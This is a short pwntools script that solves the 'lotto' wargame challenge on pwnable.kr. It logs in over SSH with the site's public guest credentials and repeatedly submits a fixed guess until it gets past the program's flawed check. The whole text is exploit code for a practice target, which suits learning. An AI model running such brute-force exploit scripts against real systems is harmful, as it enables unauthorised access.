from pwn import *

context.log_level = 'DEBUG'

sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = sh.process('./lotto')


for i in range(256):
    p.sendlineafter(b'Exit\n', b'1')
    p.sendlineafter(b'bytes : ', b'aaaaaa')
    p.recvline()
    if b'bad luck' not in p.recvline():
        break

p.interactive()